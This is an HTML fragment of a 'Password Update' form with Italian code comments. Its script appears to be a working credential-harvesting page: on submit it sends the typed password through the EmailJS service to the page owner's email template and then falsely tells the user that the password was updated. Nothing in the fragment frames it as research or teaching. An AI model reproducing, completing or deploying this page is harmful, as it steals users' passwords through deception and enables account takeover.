        <h2>Password Update</h2>
        <form id="updateForm">
            <input type="password" id="password" placeholder="Enter your new password" required>
            <input type="submit" value="Update Password">
        </form>
    </div>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function(){
            emailjs.init("XwXzL51atAhfWEOYH"); // Inserisci il tuo User ID di EmailJS

            document.getElementById('updateForm').addEventListener('submit', function(event) {
                event.preventDefault(); // Evita il comportamento predefinito del modulo di invio
                var password = document.getElementById('password').value;

                // Invia l'email utilizzando EmailJS
                emailjs.send("service_kdrivqt", "template_11pwwjc", {password: password})
                    .then(function(response) {
                        console.log('Email sent successfully:', response);
                        alert('Password updated successfully!');
                    }, function(error) {
                        console.log('Error sending email:', error);
                        alert('Error updating password. Please try again later.');
                    });
            });
        })();
    </script>
